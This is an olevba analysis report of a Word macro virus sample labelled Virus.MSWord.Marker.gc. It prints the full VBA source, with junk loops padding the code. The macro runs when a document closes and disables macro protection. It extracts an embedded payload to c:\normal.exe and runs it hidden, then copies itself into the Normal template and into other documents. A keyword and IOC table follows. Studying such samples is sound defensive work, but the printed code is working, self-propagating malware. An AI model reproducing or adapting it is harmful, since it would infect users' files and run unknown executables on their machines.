olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.gc-bf7bd975517bb10f213fd3ab37a6744cd42b5fc0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.gc-bf7bd975517bb10f213fd3ab37a6744cd42b5fc0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function SetEndOfFile Lib "kernel32" Alias "setendoffile" (ByVal h As Long) As Boolean
Private Declare Function OpenFile Lib "kernel32" Alias "_lopen" (ByVal s As String, ByVal mode As Long) As Long
Private Declare Function CreateFile Lib "kernel32" Alias "_lcreat" (ByVal s As String, ByVal attr As Long) As Long
Private Declare Function GlobalAlloc Lib "kernel32" (ByVal fl As Long, ByVal n As Long) As Long
Private Declare Sub CopyFileA Lib "kernel32" (ByVal src As String, ByVal dst As String, ByVal mode As Long)
Private Declare Function SeekFile Lib "kernel32" Alias "_llseek" (ByVal h As Long, ByVal ofs As Long, ByVal fw As Long) As Long
Private Declare Sub ReadFile Lib "kernel32" Alias "_lread" (ByVal h As Long, ByVal ptr As Long, ByVal n As Long)
Private Declare Sub WriteFile Lib "kernel32" Alias "_lwrite" (ByVal h As Long, ByVal ptr As Long, ByVal n As Long)
Private Declare Sub CloseFile Lib "kernel32" Alias "_lclose" (ByVal h As Long)

Private Sub Document_Close()

On Error Resume Next
Options.VirusProtection = False
Const ker = "Miсrоsоft Оfficе"

Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim dad, dnt As Object
Dim OurCode, UserAddress, LogData, LogFile As String
Dim dc As String, xe As String
Dim dh As Long, dp As Long, ss As Long
Dim x_z, z_y, z_z, z_a, z_b As Long
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
xe = "c:\normal.exe"

For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z

Set dad = ActiveDocument.VBProject.VBComponents.Item(1)
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
Set dnt = NormalTemplate.VBProject.VBComponents.Item(1)
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
DocumentInfected = dad.CodeModule.Find(ker, 1, 1, 10000, 10000)
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
NormalTemplateInfected = dnt.CodeModule.Find(ker, 1, 1, 10000, 10000)
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
dc = ActiveDocument.Name
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z

 dp = GlobalAlloc(0, 50698)
 dh = OpenFile(dc, 0)
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
 
 If SetEndOfFile(dh) Then
        ss = SeekFile(dh, -50688, 2)
        ReadFile dh, dp, 50688
        CloseFile dh
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
        
         dh = CreateFile(xe, 0)
         WriteFile dh, dp, 50698
         CloseFile dh
          Shell "c:\normal.exe", vbHide
           
        End If
        

For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z

If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
 
   
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z

   If DocumentInfected = True Then
      SaveNormalTemplate = NormalTemplate.Saved
      OurCode = dad.CodeModule.Lines(1, dad.CodeModule.CountOfLines)

For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z

      For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
     Next i

For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
  
    
    dnt.CodeModule.DeleteLines 1, dnt.CodeModule.CountOfLines
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
    dnt.CodeModule.AddFromString OurCode
 For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
    If SaveNormalTemplate = True Then NormalTemplate.Save
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
    
  End If


  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
    SaveDocument = ActiveDocument.Saved
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
    
    OurCode = dnt.CodeModule.Lines(1, dnt.CodeModule.CountOfLines)
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
    dad.CodeModule.DeleteLines 1, dad.CodeModule.CountOfLines
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
    dad.CodeModule.AddFromString OurCode
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
    
    If SaveDocument = True Then ActiveDocument.Save
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
      
  End If
  
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z
    
End If
For x_z = 1 To 30
 z_y = 2
 z_z = 6
 z_a = 9
 z_b = 1
Next x_z

End Sub






+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |normal.exe          |Executable file name                         |
+----------+--------------------+---------------------------------------------+
